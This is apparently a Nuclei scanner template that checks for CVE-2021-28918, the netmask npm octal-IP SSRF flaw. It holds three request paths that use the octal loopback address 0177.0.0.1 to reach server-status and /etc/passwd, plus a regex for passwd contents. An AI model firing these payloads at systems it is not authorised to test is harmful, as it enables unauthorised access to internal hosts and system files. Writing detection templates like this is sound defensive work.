http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - Apache Server Status
    - Server Version
  - regex:
    - 'root:.*:0:0:'
    type: regex
  matchers-condition: or
  method: GET
  path:
  - '{{BaseURL}}/?url=http://0177.0.0.1/server-status'
  - '{{BaseURL}}/?host=http://0177.0.0.1/server-status'
  - '{{BaseURL}}/?file=http://0177.0.0.1/etc/passwd'
  stop-at-first-match: true
id: CVE-2021-28918
info:
  author: johnjhacking
  classification:
    cpe: cpe:2.3:a:netmask_project:netmask:*:*:*:*:*:node.js:*:*
    cve-id: CVE-2021-28918
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
    cwe-id: CWE-704
    epss-percentile: 0.99348
    epss-score: 0.85896
  description: Netmask NPM Package is susceptible to server-side request forgery because
    of improper input validation of octal strings in netmask npm package. This allows
    unauthenticated remote attackers to perform indeterminate SSRF, remote file inclusion,
    and local file inclusion attacks on many of the dependent packages. A remote unauthenticated
    attacker can bypass packages relying on netmask to filter IPs and reach critical
    VPN or LAN hosts.
  impact: 'An attacker can exploit this vulnerability to make requests to internal
    resources, potentially leading to unauthorized access or information disclosure.

    '
  metadata:
    framework: node.js
    max-request: 3
    product: netmask
    vendor: netmask_project
  name: Netmask NPM Package - Server-Side Request Forgery
  reference:
  - https://github.com/sickcodes/security/blob/master/advisories/SICK-2021-011.md
  - https://github.com/advisories/GHSA-pch5-whg9-qr2r
  - https://nvd.nist.gov/vuln/detail/CVE-2021-28918
  - https://github.com/rs/node-netmask
  - https://rootdaemon.com/2021/03/29/vulnerability-in-netmask-npm-package-affects-280000-projects/
  remediation: 'Upgrade to Netmask version 2.0.0 or later, which includes a fix for
    this vulnerability.

    '
  severity: critical
  tags: cve2021,cve,npm,netmask,ssrf,lfi,netmask_project,node.js,vuln
